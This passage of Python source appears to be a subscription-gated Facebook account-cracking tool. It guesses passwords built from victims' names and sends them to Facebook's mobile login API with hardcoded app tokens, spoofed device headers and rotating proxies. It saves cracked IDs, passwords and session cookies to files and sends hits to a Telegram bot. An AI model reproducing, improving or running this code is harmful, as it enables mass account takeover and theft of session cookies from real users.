                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = self.get_random_ua()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                    "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": device_id,
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
                    "access_token": f"{accessToken}",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": country_locale,
                    "client_country_code": country_code,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                }
                url = "https://api.facebook.com/auth/login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                proxies = self.get_random_proxy()
                if proxies:
                    po = requests.post(url, data=data, headers=headers, proxies=proxies).json()
                else:
                    po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{R}<{W}[{G}PS-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')

                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/PS-/FILE/PS-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M3 : {ids}|{pas}|{cookie}"
                        requests.get(f"f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')

                    open('/sdcard/PS-/FILE/PS-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                        
                    open('/sdcard/PS-/FILE/PS-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

    def download_file(self, filename, dest_dir='/sdcard/PS-/FILES/'):
        try:
            os.makedirs(dest_dir, exist_ok=True)
            url = GITHUB_RAW_BASE + filename
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                dest_path = os.path.join(dest_dir, filename)
                if os.path.exists(dest_path):
                    os.remove(dest_path)
                with open(dest_path, 'wb') as f:
                    f.write(response.content)
                return True
            else:
                return False
        except Exception as e:
            return False

    def load_subscriptions(self):
        try:
            with open('/sdcard/PS-/FILES/subscriptions.json', 'r') as f:
                self.subscription_info = json.load(f)
            return True
        except:
            return False

    def check_subscription(self, key):
        if not self.subscription_info:
            print(f"{xp} SUBSCRIPTION FILE NOT FOUND OR EMPTY")
            return False
        key_data = self.subscription_info.get(key)
        if not key_data:
            print(f"{xp} INVALID SUBSCRIPTION KEY")
            return False
        status = key_data.get('status', '')
        expiry = key_data.get('expiry', '')
        maintenance = self.subscription_info.get('maintenance', False)
        if maintenance:
            print(f"{xp} SYSTEM UNDER MAINTENANCE. TRY AGAIN LATER.")
            return False
        if status == 'banned':
            print(f"{xp} YOUR SUBSCRIPTION IS BANNED")
            return False
        elif status != 'active':
            print(f"{xp} SUBSCRIPTION NOT ACTIVE")
            return False
        if expiry:
            try:
                expiry_date = datetime.strptime(expiry, '%Y-%m-%d')
                if expiry_date < datetime.now():
                    print(f"{xp} SUBSCRIPTION EXPIRED ON {expiry}")
                    return False
            except:
                print(f"{xp} INVALID EXPIRY DATE FORMAT")
                return False
        self.subscription_key = key
        print(f"{xp} SUBSCRIPTION VALID. WELCOME!")
        return True

    def load_user_agents(self):
        try:
            with open('/sdcard/PS-/FILES/User-Agent.txt', 'r') as f:
                agents = [line.strip() for line in f if line.strip()]
            if agents:
                self.user_agents = agents
                return True
        except:
            pass
        return False

    def get_random_ua(self):
        if self.user_agents:
            return random.choice(self.user_agents)
        else:
            return UA()

    def load_proxies(self):
        try:
            with open('/sdcard/PS-/FILES/proxies.txt', 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            return proxies
        except:
            return []

    def check_proxies(self):
        proxy_list = self.load_proxies()
        self.working_proxies = []
        if not proxy_list:
            return
        print(f"{xp} CHECKING PROXIES... (this may take a moment)")
        start_time = time.time()
        with ThreadPool(max_workers=20) as pool:
            results = pool.map(self._test_proxy, proxy_list)
        for proxy, is_working in results:
            if is_working:
                self.working_proxies.append(proxy)
        elapsed = time.time() - start_time
        print(f"{xp} PROXY CHECK DONE. WORKING: {len(self.working_proxies)}/{len(proxy_list)} IN {elapsed:.2f}s")

    def _test_proxy(self, proxy):
        proxy_url = proxy
        if not proxy.startswith('http://') and not proxy.startswith('https://') and not proxy.startswith('socks4://') and not proxy.startswith('socks5://'):
            proxy_url = f'http://{proxy}'
        proxies = {'http': proxy_url, 'https': proxy_url}
        try:
            start = time.time()
            r = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            elapsed = time.time() - start
            if r.status_code == 200 and elapsed < 10:
                return (proxy, True)
        except:
            pass
        return (proxy, False)

    def get_random_proxy(self):
        if self.working_proxies:
            proxy = random.choice(self.working_proxies)
            if proxy.startswith('http://') or proxy.startswith('https://'):
                return {'http': proxy, 'https': proxy}
            elif proxy.startswith('socks4://') or proxy.startswith('socks5://'):
                return {'http': proxy, 'https': proxy}
            else:
                return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return None

os.makedirs('/sdcard/PS-/FILES/', exist_ok=True)
os.makedirs('/sdcard/PS-/FILE/', exist_ok=True)

print(f"{xp} DOWNLOADING REQUIRED FILES...")
files_to_download = ['subscriptions.json', 'User-Agent.txt', 'proxies.txt']
ps = __PS__()
for file in files_to_download:
    success = ps.download_file(file)
    if not success:
        print(f"{xp} FAILED TO DOWNLOAD {file}. EXITING.")
        sys.exit(1)

ps.load_user_agents()
ps.check_proxies()
ps.load_subscriptions()

__CLEAR__()
print(f"{xp} ENTER YOUR SUBSCRIPTION KEY:")
__LINE__()
subscription_key = input(f"{xpx} KEY: {xpxx} ")

if not ps.check_subscription(subscription_key):
    __LINE__()
    print(f"{xp} ACCESS DENIED. EXITING...")
    time.sleep(2)
    sys.exit(0)

__CLEAR__()
ps.__MENU__()
sys.exit(0)
